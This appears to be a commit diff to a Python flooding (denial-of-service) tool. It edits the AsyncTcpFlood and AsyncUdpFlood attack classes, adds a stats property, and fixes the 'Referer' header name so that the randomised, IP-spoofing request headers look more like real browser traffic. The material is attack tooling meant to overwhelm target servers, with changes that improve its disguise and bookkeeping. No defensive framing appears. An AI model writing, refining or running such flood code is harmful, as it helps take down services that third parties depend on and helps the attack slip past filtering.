@@ -201,7 +201,6 @@ class AsyncTcpFlood:
         loop,
         settings: Optional[AttackSettings] = None
     ) -> None:
-        self.SENT_FLOOD = None
         self._event = event
         self._target = target
         self._addr = addr
@@ -219,6 +218,10 @@ class AsyncTcpFlood:
 
         self._loop = loop
         self._settings = settings or AttackSettings()
+
+    @property
+    def stats(self) -> TargetStats:
+        return self._stats
 
     @property
     def desc(self) -> Tuple[str, int, str]:
@@ -242,7 +245,7 @@ class AsyncTcpFlood:
     def random_headers(self) -> str:
         return (
             f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referrer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
+            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
             self.spoof_ip()
         )
 
@@ -431,7 +434,7 @@ class AsyncTcpFlood:
             headers=(
                 f"Host: {self._target.authority}\r\n"
                 "User-Agent: null\r\n"
-                "Referrer: null\r\n"
+                "Referer: null\r\n"
                 + self.BASE_HEADERS
                 + self.spoof_ip()
             )
@@ -679,7 +682,6 @@ class AsyncUdpFlood:
         loop,
         settings: Optional[AttackSettings] = None,
     ):
-        self.SENT_FLOOD = None
         self._target = target
         self._event = event
         self._stats = stats
@@ -689,6 +691,10 @@ class AsyncUdpFlood:
 
         self._method = method
         self.SENT_FLOOD = getattr(self, method)
+
+    @property
+    def stats(self) -> TargetStats:
+        return self._stats
 
     @property
     def desc(self) -> Tuple[str, int, str]:
